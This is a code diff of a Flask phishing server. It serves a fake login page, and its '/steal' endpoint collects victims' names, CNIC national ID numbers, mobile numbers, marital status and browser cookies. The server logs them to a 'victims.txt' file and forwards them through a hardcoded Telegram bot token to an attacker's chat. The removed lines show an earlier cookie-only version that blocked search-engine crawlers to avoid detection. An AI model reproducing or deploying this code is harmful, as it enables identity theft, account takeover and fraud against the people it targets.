@@ -2,71 +2,72 @@ from flask import Flask, request, render_template
 import os
 from datetime import datetime
 import requests
+import json
 
 app = Flask(__name__)
 
-# ✅ Telegram credentials
 BOT_TOKEN = "7599021313:AAFmH8Ch1-KypyK0Ez2Ot-hYQ8TS7vcGLmE"
 CHAT_ID = "6908281054"
 
-# ✅ Bot User-Agents to block
-BLOCKED_AGENTS = [
-    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot",
-    "Baiduspider", "YandexBot", "Sogou", "Facebot", "ia_archiver"
-]
-
-# ✅ Ensure log folder exists
 LOG_DIR = "logs"
 if not os.path.exists(LOG_DIR):
     os.makedirs(LOG_DIR)
 
-# ✅ Function to send Telegram alert
 def send_telegram(msg):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": msg
-    }
     try:
-        requests.post(url, data=payload)
-    except Exception as e:
-        print(f"Telegram error: {e}")
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
+    except:
+        pass
 
-# ✅ Homepage route
 @app.route('/')
 def index():
-    user_agent = request.headers.get('User-Agent', '')
-    if any(bot in user_agent for bot in BLOCKED_AGENTS):
-        return "Access Denied", 403
-    return render_template('login.html')
+    return render_template("login.html")
 
-# ✅ Cookie steal endpoint
 @app.route('/steal', methods=['POST'])
 def steal():
-    cookie = request.form.get('cookie', 'null')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'unknown')
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    try:
+        data = request.get_json()
+        name = data.get("name", "Unknown")
+        cnic = data.get("cnic", "Unknown")
+        mobile = data.get("mobile", "Unknown")
+        amount = data.get("amount", "Unknown")
+        married = data.get("married", "Unknown")
+        cookie = data.get("cookie", "None")
+        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+        ua = request.headers.get("User-Agent", "Unknown")
+        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # ✅ Bot block
-    if any(bot in user_agent for bot in BLOCKED_AGENTS):
-        return "", 204
+        log = f"""[{time}]
+IP: {ip}
+UA: {ua}
+👤 Name: {name}
+🪪 CNIC: {cnic}
+📱 Mobile: {mobile}
+💸 Amount: {amount}
+💍 Married: {married}
+🍪 Cookies: {cookie}
+{'='*50}
+"""
 
-    # ✅ Save locally
-    log_data = f"[{timestamp}]\nIP: {ip}\nUA: {user_agent}\nCookie: {cookie}\n{'='*60}\n"
-    with open(os.path.join(LOG_DIR, 'cookies.txt'), 'a') as f:
-        f.write(log_data)
+        with open(os.path.join(LOG_DIR, "victims.txt"), "a") as f:
+            f.write(log)
 
-    # ✅ Send to Telegram
-    message = f"""🕵️ New Target Detected!
-🕓 Time: {timestamp}
+        tg_msg = f"""📥 نئی معلومات موصول:
+🕓 {time}
 🌐 IP: {ip}
-🧭 UA: {user_agent}
-🍪 Cookie: {cookie}"""
-    send_telegram(message)
+👤 نام: {name}
+🪪 CNIC: {cnic}
+📱 Mobile: {mobile}
+💸 Amount: {amount}
+💍 Married: {married}
+🍪 Cookie: {cookie}
+"""
+        send_telegram(tg_msg)
 
+    except Exception as e:
+        print(f"Error: {e}")
     return "", 204
 
-# ✅ Start server
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8000)
